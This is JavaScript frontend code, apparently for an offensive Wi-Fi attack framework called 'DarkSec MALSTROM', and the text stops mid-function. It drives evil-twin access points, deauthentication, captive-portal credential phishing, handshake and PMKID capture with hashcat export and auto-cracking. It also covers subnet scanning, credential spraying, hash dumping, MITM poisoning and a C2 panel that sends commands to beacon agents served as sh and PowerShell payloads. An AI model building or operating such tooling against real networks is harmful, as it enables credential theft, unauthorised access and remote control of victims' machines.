/* DarkSec MALSTROM — frontend */
(function () {
  'use strict';

  var API = 'cgi-bin/api.sh';
  var session = { sid: null };
  var booted = false;
  var views = ['dashboard', 'attack', 'monitor', 'recon', 'lateral', 'mitm', 'sessions', 'loot', 'alerts', 'settings'];
  var templates = [];
  var state = null;
  var loot = { creds: [], devices: [], handshakes: [], probes: [], cracked: [], files: [], pinned: { creds: [], devices: [] } };
  var lootTab = 'creds';
  var ops = { scans: [], owned: [], hashes: [], beacons: [], mitm: { running: 0, tail: [] }, beacon: { on: 0 } };
  var wifi = { aps: [], ts: '', iface: '', running: false };
  var autopwn = { auto_harvest: false, auto_armed: false, target: null };
  var sessSel = '';
  var dirty = {};   // attack-form fields the user is editing; polls must not overwrite them

  // --- helpers -------------------------------------------------------------
  function $(id) { return document.getElementById(id); }

  function el(html) {
    var d = document.createElement('div');
    d.innerHTML = html.trim();
    return d.firstChild;
  }

  function esc(s) {
    return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }

  function qs(obj) {
    var s = [];
    Object.keys(obj).forEach(function (k) {
      s.push(encodeURIComponent(k) + '=' + encodeURIComponent(obj[k]));
    });
    return s.join('&');
  }

  function apiGet(action, params) {
    params = params || {};
    params.action = action;
    if (session.sid) params.token = session.sid;
    return fetch(API + '?' + qs(params), { credentials: 'same-origin' })
      .then(function (r) { return r.json(); })
      .catch(function () { return { ok: false, error: 'network' }; });
  }

  function toast(msg, isErr) {
    var t = document.createElement('div');
    t.className = 'toast' + (isErr ? ' error' : '');
    t.textContent = msg;
    $('toast').appendChild(t);
    setTimeout(function () { t.remove(); }, 4000);
  }

  function fmtTime(t) {
    if (!t) return '';
    return t.indexOf('UTC') >= 0 ? t : (t + ' UTC');
  }

  function downloadBlob(blob, name) {
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = name;
    document.body.appendChild(a);
    a.click();
    setTimeout(function () { URL.revokeObjectURL(a.href); a.remove(); }, 200);
  }

  function downloadUrl(url, name) {
    fetch(url, { credentials: 'same-origin' }).then(function (r) { return r.text(); }).then(function (t) {
      downloadBlob(new Blob([t || ''], { type: 'text/plain' }), name);
    });
  }

  // --- auth ----------------------------------------------------------------
  // Puts the login gate back up mid-session (e.g. the operator just enabled
  // the auth gate from Settings, which wipes every session server-side).
  function showAuthGate(hint) {
    session.sid = null;
    $('app').style.display = 'none';
    $('auth-gate').style.display = '';
    $('auth-token').focus();
    if (hint) $('auth-hint').textContent = hint;
  }

  function doAuth() {
    var token = $('auth-token').value.trim();
    if (!token) return;
    apiGet('challenge', {}).then(function (c) {
      if (!c.nonce) { $('auth-hint').textContent = 'Challenge failed — is MALSTROM running?'; return; }
      return apiGet('auth', { nonce: c.nonce, token: token });
    }).then(function (a) {
      if (a && a.ok && a.sid) {
        session.sid = a.sid;
        $('auth-gate').style.display = 'none';
        $('app').style.display = 'flex';
        $('side-token').textContent = 'SESSION ' + a.sid.slice(0, 8);
        boot();
      } else {
        $('auth-hint').textContent = 'Denied — wrong password';
      }
    });
  }
  $('auth-submit').addEventListener('click', doAuth);
  $('auth-token').addEventListener('keydown', function (e) { if (e.key === 'Enter') doAuth(); });

  // Decide the auth posture at runtime: probe /status first. If it answers ok
  // with no session the gate is OPEN — boot straight in (click-and-go, token
  // not needed). If it denies, the gate is ON — never auto-login from a
  // #token URL after a restart; pre-fill the field and require an explicit
  // login so the gate is a real gate.
  var frag = location.hash.match(/^#token=(.+)$/);
  apiGet('status').then(function (s) {
    if (s && s.ok && !session.sid) {
      if (frag) history.replaceState(null, '', location.pathname + location.search);
      $('auth-gate').style.display = 'none';
      $('app').style.display = 'flex';
      boot();
    } else {
      if (frag) {
        $('auth-token').value = decodeURIComponent(frag[1]);
        history.replaceState(null, '', location.pathname + location.search);
      }
      $('auth-token').focus();
      $('auth-hint').textContent = 'Enter the dashboard password to continue.';
    }
  });

  // --- navigation -----------------------------------------------------------
  var cur = 'dashboard';
  function setView(v) {
    cur = v;
    views.forEach(function (x) {
      $('view-' + x).style.display = (x === v) ? '' : 'none';
      document.querySelector('.nav-item[data-view="' + x + '"]').classList.toggle('active', x === v);
    });
    var names = { dashboard: 'Dashboard', attack: 'Attack', monitor: 'Monitor', recon: 'Recon &amp; Scan',
                 lateral: 'Lateral', mitm: 'MITM', sessions: 'Sessions',
                 settings: 'Settings', loot: 'Loot', alerts: 'Alerts' };
    $('crumb').innerHTML = 'DarkSec / <b>' + names[v] + '</b>';
    if (v === 'settings') pollSettings();
    if (v === 'dashboard') dashboardPoll();
  }
  document.querySelectorAll('.nav-item').forEach(function (b) {
    b.addEventListener('click', function () { setView(b.getAttribute('data-view')); });
  });
  document.querySelectorAll('[data-goto]').forEach(function (b) {
    b.addEventListener('click', function () { setView(b.getAttribute('data-goto')); });
  });

  // --- dashboard ------------------------------------------------------------
  function renderDashboard() {
    var s = state || {};
    var st = s.state || {};
    var act = !!(st.active);
    var setCard = function (id, txt, color) {
      var el = $(id);
      el.textContent = txt;
      el.style.color = color;
    };
    setCard('db-engine', s.engine ? 'ALIVE' : 'DOWN', s.engine ? 'var(--green)' : 'var(--red)');
    setCard('db-ap', act ? 'ENGAGED' : 'IDLE', act ? 'var(--red)' : 'var(--dim)');
    setCard('db-mitm', s.mitm_active ? 'ON' : 'OFF', s.mitm_active ? 'var(--green)' : 'var(--dim)');
    setCard('db-scan', s.scan_busy ? 'RUNNING' : 'IDLE', s.scan_busy ? 'var(--amber)' : 'var(--dim)');
    $('db-clients').textContent = (s.clients || []).length || 0;
    $('db-creds').textContent = s.creds_count || 0;
    $('db-hs').textContent = s.handshakes_count || 0;
    $('db-hash').textContent = s.hashes_count || 0;
    $('db-owned').textContent = s.owned_count || 0;
    $('db-beacons').textContent = s.beacon_count || 0;
    $('db-files').textContent = (loot && loot.files) ? loot.files.length : 0;
    $('db-alerts').textContent = $('nav-alerts').textContent || 0;
    $('db-target').textContent = act
      ? 'ENGAGED on ' + (st.target_ssid || '?') + ' · ch ' + (st.target_channel || '?') + ' · ' +
        (st.portal_mode || '?') + ' portal · template ' + (st.template || 'wifi_login')
      : 'No target set — open the Attack tab and ENGAGE a network to begin.';
    $('db-go-attack').textContent = act ? '\u2694 VIEW ATTACK' : '\u2694 OPEN ATTACK';
  }

  function renderActivity(evs) {
    var box = $('db-activity');
    box.innerHTML = '';
    if (!evs || !evs.length) {
      box.innerHTML = '<div class="empty">No activity yet — run an attack to see it live</div>';
      return;
    }
    evs.slice().reverse().slice(0, 14).forEach(function (l) {
      var div = document.createElement('div');
      div.className = 'logline ' + (l.type || 'INFO');
      div.innerHTML = '<span class="t">[' + (l.ts || '') + ']</span> <span class="m"></span>';
      div.querySelector('.m').textContent = l.msg || '';
      box.appendChild(div);
    });
  }

  function dashboardPoll() {
    apiGet('log', { n: 14 }).then(function (l) {
      if (l && l.ok) renderActivity(l.events);
    });
  }

  // --- status + config -------------------------------------------------------
  function applyToForm(st) {
    if (!st) return;
    function setField(id, val) {
      var el = $(id);
      if (!el) return;
      if (dirty[id] || document.activeElement === el) return;
      el.value = val;
    }
    setField('cfg-ssid', st.target_ssid || '');
    setField('cfg-bssid', st.target_bssid || '');
    setField('cfg-channel', st.target_channel || '6');
    setField('cfg-portal-mode', st.portal_mode || 'open');
    setField('cfg-psk', st.wpa_psk || '');
    setCheck('cfg-clone-bssid', !!st.clone_bssid);
    setField('cfg-rotate', st.beacon_rotate || '0');
    setCheck('cfg-cloak', !!st.ssid_cloak);
    setCheck('cfg-wpa3', !!st.wpa3_transition);
    var wpa = ($('cfg-portal-mode').value === 'wpa');
    $('psk-wrap').style.display = wpa ? '' : 'none';
    $('wpa3-wrap').style.display = wpa ? '' : 'none';
    setField('cfg-deauth', st.deauth_mode || 'broadcast');
    setField('cfg-burst', st.deauth_burst || 25);
    setField('cfg-delay', st.deauth_delay || 1);
    setCheck('cfg-continuous', st.deauth_continuous !== false);
    setField('cfg-capture', st.capture_mode || 'off');
    setCheck('cfg-karma', !!st.karma);
    setCheck('cfg-karma-respond', !!st.karma_respond);
    setCheck('cfg-relay', !!st.relay);
    setCheck('cfg-shield', !!st.shield_after_capture);
    if (st.template && (st.template === 'auto' || templates.indexOf(st.template) >= 0)) {
      setField('cfg-template', st.template);
    }
    $('see-target').textContent = st.target_ssid ? 'TARGET: ' + st.target_ssid : 'NO TARGET';
    renderChain(st);
  }

  function markDirty(id) {
    if ($(id)) dirty[id] = true;
  }

  // Shared by the attack form and the settings view (the auth-gate toggle).
  // Never clobbers a value the operator is mid-edit on: skip while dirty or
  // focused, so polls re-rendering from server truth don't snap the control
  // back before SAVE is pressed.
  function setCheck(id, on) {
    var el = $(id);
    if (!el) return;
    if (dirty[id] || document.activeElement === el) return;
    el.checked = !!on;
  }

  document.querySelectorAll('#view-attack input, #view-attack select').forEach(function (el) {
    if (!el.id) return;
    ['input', 'change', 'keyup', 'select'].forEach(function (ev) {
      el.addEventListener(ev, function () { dirty[el.id] = true; });
    });
  });

  function renderChain(st) {
    var active = !!(st && st.active);
    var auto = !!(st && st.auto_armed);
    $('btn-start').disabled = active;
    $('btn-disarm').disabled = !active;
    $('btn-cleanup').disabled = false;
    $('status-badge').className = 'badge ' + (active ? 'live' : 'idle');
    $('status-badge').textContent = active ? (auto ? 'AUTO' : 'ENGAGED') : 'IDLE';
    $('side-status').textContent = active
      ? (auto ? 'AUTO — ' : 'ACTIVE — ') + (st.target_ssid || '?')
      : 'STANDBY';
    var caps = { off: 'off', handshake: '4-way EAPOL', pmkid: 'PMKID', both: 'handshake+PMKID' };
    $('v-clone').textContent = active ? 'APPLIED (' + st.portal_mode + ' mode)' : 'idle';
    $('v-deauth').textContent = active
      ? (st.deauth_mode === 'off' ? 'DISABLED' : 'RUNNING [' + st.deauth_mode + ']')
      : 'idle';
    $('v-portal').textContent = active ? 'SERVING ' + (st.template || 'wifi_login') : 'ready';
    $('v-capture').textContent = active
      ? (st.karma ? 'LISTENING + ' : '') + (caps[st.capture_mode] || 'off')
      : 'idle';
    $('st-clients').textContent = (state && state.clients) ? state.clients.length : 0;
    $('st-creds').textContent = (state && state.creds_count) ? state.creds_count : 0;
    $('st-deauth').textContent = st.deauth_burst || 25;
    $('st-mode').textContent = active ? (auto ? 'AUTO' : 'ENGAGED') : 'STANDBY';
    $('st-mode').style.color = active ? 'var(--green)' : 'var(--dim)';
    renderAutopwn(st);
  }

  function renderAutopwn(st) {
    autopwn.auto_harvest = !!(st && st.auto_harvest);
    autopwn.auto_armed = !!(st && st.auto_armed);
    var btn = $('btn-autopwn');
    if (!btn) return;
    if (autopwn.auto_harvest) {
      btn.textContent = '\u26aa DISARM AUTO HARVEST';
      btn.classList.add('primary');
    } else {
      btn.textContent = '\u21bb ARM AUTO HARVEST';
      btn.classList.remove('primary');
    }
    var txt = autopwn.auto_harvest
      ? (autopwn.auto_armed
          ? 'Running — ' + (st.target_ssid || '?') + ' ch' + (st.target_channel || '?')
          : 'Armed — waiting for a target')
      : 'Standby — scans APs, deauths, captures handshakes/PMKIDs, then rotates';
    $('autopwn-status').textContent = txt;
  }

  function statusPoll() {
    apiGet('status').then(function (s) {
      if (!s.ok) {
        // While the login gate is up there is no session by definition —
        // 'auth required' is expected, not an error worth toasting about.
        if (!session.sid) return;
        toast('Status error: ' + (s.error || 'auth'), true);
        return;
      }
      state = s;
      applyToForm(s.state);
      if (cur === 'dashboard') renderDashboard();
      $('nav-loot').textContent = s.creds_count || 0;
      if (s.clients && (s.clients.length || $('tbl-clients').querySelectorAll('tr').length === 1)) {
        renderClients(s.clients);
      }
    });
  }

  function renderClients(clients) {
    var box = $('tbl-clients').querySelector('tbody');
    if (!clients.length) {
      box.innerHTML = '<tr><td colspan="4" class="empty">No clients on the rogue AP yet</td></tr>';
      return;
    }
    box.innerHTML = clients.map(function (c) {
      return '<tr><td>' + esc(c.ip) + '</td><td>' + esc(c.mac) + '</td><td>' +
        esc(c.name) + '</td><td>connected</td></tr>';
    }).join('');
    var wb = $('whitelist-box');
    if (state.whitelist && state.whitelist.length) {
      wb.innerHTML = state.whitelist.map(function (w) {
        return '<div class="logline"><span class="t">[W]</span> <span class="m">' + esc(w) + '</span>' +
          ' <button class="btn unshield" data-id="' + encodeURIComponent(w) + '" style="padding:1px 6px;font-size:10px">UNSHIELD</button></div>';
      }).join('');
      wb.querySelectorAll('.unshield').forEach(function (b) {
        b.addEventListener('click', function () {
          apiGet('unshield', { id: decodeURIComponent(b.getAttribute('data-id')) }).then(function (r) {
            if (r && r.removed) toast('Unshielded — portal served to this client again');
            else toast('Entry not found' + (r && r.error ? ': ' + r.error : ''), true);
            statusPoll();
          });
        });
      });
    } else {
      wb.innerHTML = '<div class="empty">None submitted credentials yet</div>';
    }
  }

  // --- loot ----------------------------------------------------------------
  function lootPoll() {
    apiGet('loot').then(function (l) {
      if (!l.ok) return;
      loot = {
        creds: l.creds || [],
        devices: l.devices || [],
        handshakes: l.handshakes || [],
        probes: l.probes || [],
        cracked: l.cracked || [],
        files: l.files || [],
        pinned: l.pinned || { creds: [], devices: [] }
      };
      $('nav-loot').textContent = loot.creds.length;
      $('lc-creds').textContent = loot.creds.length || '';
      $('lc-devices').textContent = loot.devices.length || '';
      $('lc-hs').textContent = loot.handshakes.length || '';
      $('lc-cracked').textContent = loot.cracked.length || '';
      $('lc-probes').textContent = loot.probes.length || '';
      renderLootTab(lootTab);
      renderProbePanel();
    });
  }

  function switchLootTab(tab) {
    lootTab = tab;
    renderLootTab(tab);
  }

  function credKey(e) {
    return ((e.ts || '') + '|' + (e.username || '') + '|' + (e.mac || ''));
  }

  function bindPins(tbody) {
    tbody.querySelectorAll('.pin-btn').forEach(function (btn) {
      btn.addEventListener('click', function () {
        var kind = btn.getAttribute('data-kind');
        var id = decodeURIComponent(btn.getAttribute('data-id'));
        apiGet('pin', { kind: kind, id: id }).then(function (r) {
          if (!r.ok) { toast('Pin failed: ' + (r.error || '?'), true); return; }
          loot.pinned = r.pinned || loot.pinned;
          renderLootTab(lootTab);
        });
      });
    });
  }

  function renderLootTab(tab) {
    $('table-creds').parentElement.style.display = (tab === 'creds') ? '' : 'none';
    $('table-devices').parentElement.style.display = (tab === 'devices') ? '' : 'none';
    $('table-handshakes').parentElement.style.display = (tab === 'handshakes') ? '' : 'none';
    $('table-cracked').parentElement.style.display = (tab === 'cracked') ? '' : 'none';
    $('table-probes').parentElement.style.display = (tab === 'probes') ? '' : 'none';
    $('loot-files').style.display = (tab === 'files') ? '' : 'none';
    $('btn-export-csv').disabled = (tab === 'files');
    $('btn-export-json').disabled = (tab !== 'creds');

    var creds = $('table-creds').querySelector('tbody');
    if (tab === 'creds') {
      if (!loot.creds.length) {
        creds.innerHTML = '<tr><td colspan="7" class="empty">No credentials captured yet</td></tr>';
        return;
      }
      var pinnedCreds = (loot.pinned && loot.pinned.creds) || [];
      creds.innerHTML = loot.creds.map(function (e) {
        var k = credKey(e);
        var pin = pinnedCreds.indexOf(k) !== -1;
        return '<tr><td><button class="pin-btn' + (pin ? ' active' : '') + '" data-kind="cred" data-id="' +
          encodeURIComponent(k) + '" title="' + (pin ? 'Unpin' : 'Pin (kept on clear)') + '">' +
          (pin ? '★' : '☆') + '</button></td><td>' + esc(fmtTime(e.ts)) + '</td><td>' + esc(e.device) + '</td>' +
          '<td>' + esc(e.username || '—') + '</td><td class="pass">' + esc(e.password || '—') + '</td>' +
          '<td>' + esc(e.ip || '—') + '</td><td>' + esc(e.mac || '—') + '</td></tr>';
      }).join('');
      bindPins(creds);
      return;
    }
    if (tab === 'devices') {
      var devs = $('table-devices').querySelector('tbody');
      if (!loot.devices.length) {
        devs.innerHTML = '<tr><td colspan="7" class="empty">No device fingerprints yet</td></tr>';
        return;
      }
      var pinnedDevs = (loot.pinned && loot.pinned.devices) || [];
      devs.innerHTML = loot.devices.map(function (d) {
        var mac = (d.mac || '').toUpperCase();
        var pin = pinnedDevs.indexOf(mac) !== -1;
        return '<tr><td><button class="pin-btn' + (pin ? ' active' : '') + '" data-kind="device" data-id="' +
          encodeURIComponent(mac) + '" title="' + (pin ? 'Unpin' : 'Pin (kept on clear)') + '">' +
          (pin ? '★' : '☆') + '</button></td><td>' + esc(fmtTime(d.last_seen)) + '</td><td>' + esc(d.mac || '—') + '</td><td>' +
          esc(d.os || '—') + '</td><td>' + esc(d.hostname || '—') + '</td><td>' +
          esc((d.ips || []).join(', ')) + '</td><td>' + esc(d.creds) + '</td></tr>';
      }).join('');
      bindPins(devs);
      return;
    }
    if (tab === 'handshakes') {
      var hs = $('table-handshakes').querySelector('tbody');
      if (!loot.handshakes.length) {
        hs.innerHTML = '<tr><td colspan="7" class="empty">No handshake / PMKID captures yet</td></tr>';
        return;
      }
      hs.innerHTML = loot.handshakes.map(function (h) {
        var v = h.checked
          ? (h.valid
              ? '<span style="color:var(--green)">&#10003; crackable</span>'
              : '<span style="color:var(--red)">&#10007; not usable</span>')
          : '<span style="color:var(--amber)">—</span>';
        var dl = '';
        if (h.file) {
          dl = ' <a class="btn" data-hs="' + encodeURIComponent(h.file) +
            '" href="#" style="padding:2px 8px;font-size:11px">22000</a>';
        }
        return '<tr><td>' + esc(fmtTime(h.ts)) + '</td><td>' + esc(h.bssid || '—') + '</td><td>' +
          esc(h.ssid || '—') + '</td><td>' + esc(h.client || '—') + '</td><td>' +
          esc(h.kind || '—') + '</td><td>' + v + '</td><td>' +
          esc(h.file ? h.file.replace(/^.*\//, '') : (dl ? '—' : 'no pcap')) + dl + '</td><td class="pass">' +
          (h.cracked
            ? '<span style="color:var(--green)">' + esc(h.cracked) + '</span>'
            : '—') + '</td></tr>';
      }).join('');
      hs.querySelectorAll('a[data-hs]').forEach(function (a) {
        a.addEventListener('click', function (e) {
          e.preventDefault();
          downloadUrl(API + '?' + qs({ action: 'hashcat_export', token: session.sid || '',
                                       file: decodeURIComponent(a.getAttribute('data-hs')) }),
                      'malstrom_capture.22000');
        });
      });
      return;
    }
    if (tab === 'cracked') {
      var ck = $('table-cracked').querySelector('tbody');
      if (!loot.cracked.length) {
        ck.innerHTML = '<tr><td colspan="5" class="empty">Nothing cracked yet — auto-crack runs when a verified capture lands</td></tr>';
        return;
      }
      ck.innerHTML = loot.cracked.slice().reverse().map(function (c) {
        return '<tr><td>' + esc(fmtTime(c.ts)) + '</td><td>' + esc(c.ssid || '—') + '</td><td>' +
          esc(c.bssid || '—') + '</td><td class="pass">' + esc(c.psk || '') + '</td><td>' +
          esc(c.source || '—') + '</td></tr>';
      }).join('');
      return;
    }
    if (tab === 'probes') {
      var pb = $('table-probes').querySelector('tbody');
      if (!loot.probes.length) {
        pb.innerHTML = '<tr><td colspan="3" class="empty">No probe requests yet</td></tr>';
        return;
      }
      pb.innerHTML = loot.probes.slice().reverse().slice(0, 100).map(function (p) {
        return '<tr><td>' + esc(fmtTime(p.ts)) + '</td><td>' + esc(p.mac || '—') + '</td><td>' +
          esc(p.ssid || '—') + '</td></tr>';
      }).join('');
      return;
    }
    if (tab === 'files') {
      var box = $('loot-files');
      if (!loot.files.length) {
        box.innerHTML = '<div class="empty">No files in the loot tree yet</div>';
        return;
      }
      box.innerHTML = '<table class="cred-table"><thead><tr><th>File</th><th>Size</th><th></th></tr></thead><tbody>' +
        loot.files.map(function (f) {
          return '<tr><td>' + esc(f.name) + '</td><td>' + esc(f.size) + ' B</td><td>' +
            '<a class="dl" href="#" data-file="' + encodeURIComponent(f.name) + '">DOWNLOAD</a></td></tr>';
        }).join('') + '</tbody></table>';
      box.querySelectorAll('a.dl').forEach(function (a) {
        a.addEventListener('click', function (e) {
          e.preventDefault();
          var url = API + '?' + qs({ action: 'loot_file', token: session.sid || '', file: decodeURIComponent(a.getAttribute('data-file')) });
          fetch(url, { credentials: 'same-origin' }).then(function (r) { return r.blob(); }).then(function (b) {
            downloadBlob(b, decodeURIComponent(a.getAttribute('data-file')).replace(/^.*\//, ''));
          });
        });
      });
    }
  }

  function renderProbePanel() {
    var box = $('tbl-probes').querySelector('tbody');
    if (!loot.probes.length) {
      box.innerHTML = '<tr><td colspan="4" class="empty">No probe requests recorded yet</td></tr>';
      return;
    }
    box.innerHTML = loot.probes.slice().reverse().slice(0, 30).map(function (p) {
      return '<tr><td>' + esc(fmtTime(p.ts)) + '</td><td>' + esc(p.mac || '—') + '</td><td>' +
        esc(p.ssid || '—') + '</td><td><button class="btn" data-adopt="' + encodeURIComponent(p.ssid || '') +
        '" style="padding:4px 10px;font-size:11px">ADOPT</button></td></tr>';
    }).join('');
    box.querySelectorAll('button[data-adopt]').forEach(function (b) {
      b.addEventListener('click', function () {
        var ssid = decodeURIComponent(b.getAttribute('data-adopt'));
        apiGet('adopt_ssid', { ssid: ssid }).then(function (r) {
          if (r.ok) {
            $('cfg-ssid').value = ssid;
            markDirty('cfg-ssid');
            toast('Adopted probe interest: ' + ssid);
            statusPoll();
          } else toast('Adopt failed: ' + (r.error || '?'), true);
        });
      });
    });
  }

  function alertsPoll() {
    apiGet('alerts').then(function (a) {
      if (!a.ok) return;
      var box = $('alert-box');
      $('nav-alerts').textContent = a.alerts ? a.alerts.length : 0;
      if (!a.alerts || !a.alerts.length) {
        box.innerHTML = '<div class="empty">No alerts</div>';
      } else {
        box.innerHTML = a.alerts.map(function (al) {
          return '<div class="alert-item"><span class="time">' + esc(fmtTime(al.ts)) + '</span>' + esc(al.msg) + '</div>';
        }).reverse().join('');
      }
    });
  }

  // --- post-exploitation (recon / lateral / mitm / sessions) --------------------
  function opsPoll() {
    apiGet('ops').then(function (o) {
      if (!o.ok) return;
      ops = {
        scans: o.scans || [],
        owned: o.owned || [],
        hashes: o.hashes || [],
        beacons: o.beacons || [],
        mitm: o.mitm || { running: 0, tail: [] },
        beacon: o.beacon || { on: 0 },
        scan_busy: !!o.scan_busy,
        spray_busy: !!o.spray_busy
      };
      $('nav-recon').textContent = ops.scans.length || '';
      $('nav-owned').textContent = ops.owned.length || '';
      $('nav-hash').textContent = ops.hashes.length || '';
      $('nav-sess').textContent = ops.beacons.length || '';
      renderScans();
      renderOwned();
      renderHashes();
      renderMitm();
      renderSessions();
      renderBeacon();
      buildHostList();
    });
  }

  function renderBeacon() {
    var on = !!ops.beacon.on;
    $('cfg-beacon').checked = on;
    $('beacon-payloads').style.display = on ? '' : 'none';
    $('beacon-status').textContent = on
      ? 'Armed — serve <code>http://' + gatewayHint() + '/beacon</code> (sh) or <code>/beacon.ps1</code> (Windows), key '
        + (ops.beacon.key || '').slice(0, 6) + '…'
      : 'Off — agents phone home but receive nothing';
  }

  function gatewayHint() {
    return (state && state.sys && state.sys.portal_ip) || '172.16.52.1';
  }

  function buildHostList() {
    var done = null;
    ops.scans.forEach(function (s) { if (s.status === 'done' && (!done || s.started > done.started)) done = s; });
    var dl = $('scan-hosts-dl');
    var box = $('scan-hosts-box');
    if (done && done.hosts && done.hosts.length) {
      var list = done.hosts.map(function (h) { return h.ip; });
      dl.innerHTML = list.map(function (i) { return '<option value="' + esc(i) + '"></option>'; }).join('');
      var rows = done.hosts.map(function (h) {
        var ports = (done.ports && done.ports[h.ip] && done.ports[h.ip].length)
          ? done.ports[h.ip].map(function (p) { return p.port + '/' + (p.svc || p.proto); }).join(', ')
          : '';
        return '<tr><td>' + esc(h.ip) + '</td><td>' + esc(h.mac || '—') + '</td><td>' +
          esc(h.hostname || '—') + '</td><td>' + esc(ports || '—') + '</td></tr>';
      }).join('');
      box.innerHTML = '<table class="cred-table"><thead><tr><th>IP</th><th>MAC</th><th>Hostname</th><th>Open ports</th></tr></thead><tbody>' +
        rows + '</tbody></table>';
      $('btn-scan-to-spray').disabled = false;
    } else {
      box.innerHTML = '<div class="empty">Run a scan to build the subnet picture</div>';
      $('btn-scan-to-spray').disabled = true;
    }
  }

  function renderScans() {
    var tb = $('tbl-scans').querySelector('tbody');
    // dump / crack job states on the lateral + mitm panels
    var recent = ops.scans.filter(function (s) {
      return s.kind === 'crack' || s.kind === 'sam' || s.kind === 'lsa';
    });
    var last = recent[recent.length - 1];
    if (last) {
      var st = last.status === 'running' ? 'running…'
        : last.status === 'done'
          ? (last.kind === 'crack'
              ? 'done — ' + (last.cracked || 0) + ' recovered'
              : 'done — ' + ((last.hashes || []).length) + ' hashes')
          : (last.status === 'error' ? 'error: ' + (last.error || '?') : last.status);
      if (last.kind === 'crack') $('crack-state').textContent = st;
      else $('dump-state').textContent = st;
    }
    if (!ops.scans.length) {
      tb.innerHTML = '<tr><td colspan="5" class="empty">No scans yet</td></tr>';
      return;
    }
    tb.innerHTML = ops.scans.slice().reverse().slice(0, 25).map(function (s) {
      var st = s.status;
      var badge = st === 'done' ? '<span style="color:var(--green)">done</span>'
        : st === 'running' ? '<span style="color:var(--amber)">running…</span>'
          : '<span style="color:var(--red)">' + (st === 'error' ? 'error' : st) + '</span>';
      return '<tr><td>' + esc(fmtTime(s.ts)) + '</td><td>' + esc(s.kind === 'ping' ? 'discovery' : s.kind) +
        '</td><td>' + esc(s.target || '') + '</td><td>' + badge + '</td><td>' +
        esc(s.hosts ? s.hosts.length : '') + '</td></tr>';
    }).join('');
  }

  function renderOwned() {
    var tb = $('tbl-owned').querySelector('tbody');
    if (!ops.owned.length) {
      tb.innerHTML = '<tr><td colspan="5" class="empty">No validated pairs yet</td></tr>';
      return;
    }
    tb.innerHTML = ops.owned.slice().reverse().slice(0, 60).map(function (o) {
      return '<tr><td>' + esc(fmtTime(o.ts)) + '</td><td>' + esc(o.proto || '') + '</td><td>' +
        esc(o.ip || '') + '</td><td>' + esc(o.user || '') + '</td><td class="pass">' + esc(o.pass || '') + '</td></tr>';
    }).join('');
  }

  function renderHashes() {
    var tb = $('tbl-hashes').querySelector('tbody');
    if (!ops.hashes.length) {
      tb.innerHTML = '<tr><td colspan="4" class="empty">No hashes captured yet</td></tr>';
      return;
    }
    tb.innerHTML = ops.hashes.slice().reverse().slice(0, 60).map(function (h) {
      return '<tr><td>' + esc(fmtTime(h.ts)) + '</td><td>' + esc(h.user || '?') + '</td>' +
        '<td class="pass" style="font-size:11px">' + esc(h.token || '') + '</td><td class="pass">' +
        (h.pass ? '<span style="color:var(--green)">' + esc(h.pass) + '</span>' : '—') +
        '</td></tr>';
    }).join('');
  }

  function renderMitm() {
    var on = !!ops.mitm.running;
    var btn = $('btn-mitm');
    btn.textContent = on ? 'DISARM POISONING' : 'ARM POISONING';
    btn.disabled = on ? false : !(state && state.state && state.state.active);
    $('mitm-status').textContent = on
      ? 'Active on ' + (ops.mitm.iface || '?') + ' — hashes streaming to Loot'
      : 'Standby (requires the chain to be armed — portal subnet up)';
    var box = $('mitm-log');
    if (ops.mitm.tail && ops.mitm.tail.length) {
      box.textContent = ops.mitm.tail.join('\n');
      box.scrollTop = box.scrollHeight;
    } else {
      box.innerHTML = '<div class="empty">Not running</div>';
    }
  }

  function renderSessions() {
    var tb = $('tbl-sessions').querySelector('tbody');
    var sel = $('sess-select');
    var cur = sel.value || sessSel;
    if (!ops.beacons.length) {
      tb.innerHTML = '<tr><td colspan="9" class="empty">No sessions yet</td></tr>';
      sel.innerHTML = '<option value="">(no sessions)</option>';
      $('sess-out').innerHTML = '<div class="empty">Nothing returned yet</div>';
      return;
    }
    tb.innerHTML = ops.beacons.map(function (s) {
      var st = s.state || 'live';
      var badge = st === 'live'
        ? '<span style="color:var(--green)">&#9679; LIVE</span>'
        : st === 'stale'
          ? '<span style="color:var(--amber)">&#9679; STALE</span>'
          : '<span style="color:var(--red)">&#9679; DEAD</span>';
      return '<tr><td>' + esc(s.id) + '</td><td>' + esc(s.ip || '') + '</td><td>' + esc(s.host || '—') +
        '</td><td>' + esc(s.os || '—') + '</td><td>' + esc(s.user || '—') + '</td><td>' + badge + '</td><td>' +
        esc(fmtTime(s.last_seen)) + '</td><td>' + esc((s.tasks || []).length) + '</td><td>' +
        '<button class="btn" data-c2="' + esc(s.id) + '" style="padding:4px 10px;font-size:11px">CMD</button></td></tr>';
    }).join('');
    sel.innerHTML = ops.beacons.map(function (s) {
      var label = esc(s.host || s.ip) + ' (' + esc(s.os || '?') + ')';
      return '<option value="' + esc(s.id) + '">' + label + '</option>';
    }).join('');
    sel.value = cur;
    sessSel = sel.value;
    var active = null;
    ops.beacons.forEach(function (s) { if (sessSel === s.id) active = s; });
    if (!active) active = ops.beacons.slice().sort(function (a, b) { return (b.last_seen || '').localeCompare(a.last_seen || ''); })[0];
    var out = active && active.out && active.out.length ? active.out.slice().reverse() : [];
    if (!out.length) {
      $('sess-out').innerHTML = '<div class="empty">Nothing returned yet</div>';
    } else {
      $('sess-out').innerHTML = out.map(function (o) {
        var dl = '';
        if (o.file) {
          var fn = decodeURIComponent(o.file).replace(/^.*beacon\//, 'beacon/');
          dl = ' <a class="btn" target="_blank" style="padding:2px 8px;font-size:11px" href="' + API + '?' +
            qs({ action: 'loot_file', token: session.sid || '', file: fn }) + '">DOWNLOAD</a>';
        }
        return '<div class="logline"><span class="t">[' + esc(fmtTime(o.ts)) + '] ' + esc(o.cmd || '') + '</span><br><span class="m">' +
          String(o.out || '').replace(/</g, '&lt;').replace(/\n/g, '<br>') + '</span>' + dl + '</div>';
      }).join('');
    }
    tb.querySelectorAll('button[data-c2]').forEach(function (b) {
      b.addEventListener('click', function () {
        sessSel = b.getAttribute('data-c2');
        $('sess-select').value = sessSel;
        setView('sessions');
        $('sess-cmd').focus();
      });
    });
    renderTerminal(active);
    renderFileBrowser(active);
    renderPivots(active);
  }

  function renderTerminal(active) {
    $('cfg-term').checked = !!(active && active.term_on);
    $('sess-term-state').textContent = active && active.term_on
      ? '(streaming — commands run on the agent at each poll)'
      : '(started when you run the first command)';
